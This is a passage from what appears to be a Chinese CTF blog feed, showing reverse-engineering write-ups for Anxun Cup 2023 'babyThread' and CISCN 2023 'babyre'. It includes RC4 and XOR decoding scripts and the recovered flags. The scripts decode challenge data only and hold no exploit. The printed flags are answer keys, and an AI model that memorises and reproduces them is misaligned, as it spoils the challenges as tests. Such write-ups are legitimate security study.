punctuation">;</span>          Data<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^=</span> s<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>      <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v7<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1F0h] [ebp-64h]  </span>    <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+20Ch] [ebp-48h]  </span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+218h] [ebp-3Ch]  </span>    <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+224h] [ebp-30h]  </span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+230h] [ebp-24h]  </span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> v12<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+23Ch] [ebp-18h] BYREF  </span>      <span class="token comment">// string Destination = "FD,B0?YORg@:*VTCLnY4";    </span>    <span class="token comment">// string Destination = "D..^!ARBIh@;K:dAU-K`";    </span>    string Destination <span class="token operator">=</span> <span class="token string">"!This_program_cannot"</span><span class="token punctuation">;</span>        v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">85</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7225</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">614125</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52200625</span><span class="token punctuation">;</span>      v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      cout<span class="token operator">&lt;&lt;</span><span class="token string">"v8: "</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> v11 <span class="token operator">&lt;</span> Destination<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span> Destination<span class="token punctuation">[</span>i <span class="token operator">+</span> v11<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">122</span> <span class="token punctuation">)</span>                  v12<span class="token punctuation">[</span>i <span class="token operator">+</span> v10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token keyword">else</span>            v8 <span class="token operator">+=</span> v7<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>Destination<span class="token punctuation">[</span>i <span class="token operator">+</span> v11<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%.8x "</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>            v12<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8  <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>          v12<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">BYTE1</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>          v12<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">BYTE2</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>          v12<span class="token punctuation">[</span>v10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>            v11 <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>          v10 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> enc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">char</span> s_box<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        cout<span class="token operator">&lt;&lt;</span><span class="token string">"key: "</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%.2x "</span><span class="token punctuation">,</span> v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>        <span class="token function">rc4_init</span><span class="token punctuation">(</span>s_box<span class="token punctuation">,</span> v12<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>s_box<span class="token punctuation">,</span> enc<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">Destination <span class="token operator">=</span> <span class="token string">"!This_program_cannot"</span>  Key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>  v7 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">7225</span><span class="token punctuation">,</span> <span class="token number">614125</span><span class="token punctuation">,</span> <span class="token number">52200625</span><span class="token punctuation">]</span>  v11 <span class="token operator">=</span> <span class="token number">0</span>  v10 <span class="token operator">=</span> <span class="token number">0</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"v8: "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">while</span> v11 <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Destination<span class="token punctuation">)</span><span class="token punctuation">:</span>      v8 <span class="token operator">=</span> <span class="token number">0</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> Destination<span class="token punctuation">[</span>i <span class="token operator">+</span> v11<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">122</span><span class="token punctuation">:</span>              Key<span class="token punctuation">[</span>i <span class="token operator">+</span> v10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              v8 <span class="token operator">+=</span> v7<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>Destination<span class="token punctuation">[</span>i <span class="token operator">+</span> v11<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">33</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>        Key<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8 <span class="token operator">&amp;</span> <span class="token number">0xFF</span>      Key<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v8 <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>      Key<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v8 <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>      Key<span class="token punctuation">[</span>v10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v8 <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>        v11 <span class="token operator">+=</span> <span class="token number">5</span>      v10 <span class="token operator">+=</span> <span class="token number">4</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Key: "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>Key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      Str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span>         <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">]</span>  <span class="token comment"># 待加解密的内容  </span>flag <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 存放加解密后的结果  </span>  <span class="token comment"># ---------- rc4_init ----------  </span>s_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 定义 s 盒  </span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 生成初始 s 盒  </span>    s_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>      <span class="token comment">#   T[i] = K[i mod len(Key)]    # 这个算法里没有 T[i]，下面会解释  </span>t <span class="token operator">=</span> <span class="token number">0</span>  j <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 打乱 s 盒顺序  </span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>      j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> Key<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>  <span class="token comment"># j = (j + S[i] + T[i]) mod 256  </span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>      s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp      t <span class="token operator">=</span> t <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># 这里引入的 t 加一个 if 条件其实就是为了做 t = i % len(Key)</span>    <span class="token keyword">if</span> t <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Key<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Key[t] 配合 t = i % len(Key) 就是实现了 T[i] = K[i mod len(Key)]</span>    t <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 小细节写法不同而已，大致思路是一样的  </span>  <span class="token comment"># ---------- rc4_crypt ----------  </span>i <span class="token operator">=</span> <span class="token number">0</span>  j <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>      j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>  <span class="token comment"># &amp; 0xff 是为了做 % 256，两者效果相同  </span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>      s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>      s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp      t <span class="token operator">=</span> <span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>  <span class="token comment"># &amp; 0xff 是为了做 % 256，两者效果相同  </span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>Str<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> s_box<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 明文异或得密文，密文异或得明文  </span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>SYC{Th1s_is_@_EasY_3ncryptO!!!!}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread14.png" alt="安洵杯2023-babyThread14.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread15.png" alt="安洵杯2023-babyThread15.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CISCN 2023】babyre</title>
      <link href="/posts/efaf94ba.html"/>
      <url>/posts/efaf94ba.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>XML 文件可以是 Snap! 图像编程语言的文件，可以根据 XML 的 <code>&lt;project name=&quot;re4baby22&quot; app=&quot;Snap! 8.2, https://snap.berkeley.edu&quot; version=&quot;2&quot;&gt;</code> 得知</li></ul><hr><p><a href="https://ctf.ichunqiu.com/2023ciscn">（2023年5月27日-2023年5月28日）【CISCN 2023】babyre</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>下载得到一个 <code>babyre.xml</code> 文件，VScode 打开发现很乱，无法阅读：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-babyRE1.png" alt="CISCN2023-babyRE1.png"></p><p>使用浏览器打开分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-babyRE2.png" alt="CISCN2023-babyRE2.png"></p><p>搜索 flag，发现一个字符串 <code>flag&#123;o_shit_i_dont_know_that&#125;</code>，但明显不是真正的 flag</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-babyRE3.png" alt="CISCN2023-babyRE3.png"></p><p>不过有一串可疑的数据：<code>102,10,13,6,28,20,48,44,27,1,29,43,54,54,59,11,1,26,43,52,5,1,24,40,43,28,9,21,9</code></p><p>由于阅读文件内容无果，但是注意到 XML 项目文件是由 <code>Snap!</code> 生成的</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-babyRE4.png" alt="CISCN2023-babyRE4.png"></p><p>百度可知这是一个图形编程语言：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-babyRE5.png" alt="CISCN2023-babyRE5.png"></p><p>进入官网：<a href="https://snap.berkeley.edu/">https://snap.berkeley.edu</a></p><p>创建新项目，发现可以导入项目，将刚刚的 <code>babyre.xml</code> 导入进来：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-babyRE6.png" alt="CISCN2023-babyRE6.png"></p><p>根据提示运行项目，点击右上角绿色旗帜，按空格键<br>发现运行到一个带锁的界面，要求输入 flag：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-babyRE7.png" alt="CISCN2023-babyRE7.png"></p><p>双击锁的图案，在中间一栏出现逻辑：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-babyRE8.png" alt="CISCN2023-babyRE8.png"></p><p>分析流程可知，当询问 “Give me the flag” 时，输入的回答 <code>key</code> 就是最终的 flag</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-babyRE9.png" alt="CISCN2023-babyRE9.png"></p><p>当 <code>is_ok = 1</code> 时，说明输入正确<br>找到 <code>secret</code> 的生成流程：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-babyRE10.png" alt="CISCN2023-babyRE10.png"></p><p>最终得到的 <code>secret</code> 为：<code>[102, 10, 13, 6, 28, 74, 3, 1, 3, 7, 85, 0, 4, 75, 20, 92, 92, 8, 28, 25, 81, 83, 7, 28, 76, 88, 9, 0, 29, 73, 0, 86, 4, 87, 87, 82, 84, 85, 4, 85, 87, 30]</code></p><p>根据校验逻辑编写脚本即可，校验比较简单，主要是异或操作：<code>return a^b</code></p><p>已知 <code>key</code> 的第一项为 102，即字符 <code>&#39;f&#39;</code><br>根据 <code>key[i] ^ key[i - 1] = secret[i]</code>，依次求出后续 <code>key</code> 值</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span>       <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> <span class="token string">'f'</span>  <span class="token comment"># 102  </span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">^</span> secret<span class="token punctuation">[</span>i<span class="token punctuation">]</span>      key <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-babyRE11.png" alt="CISCN2023-babyRE11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
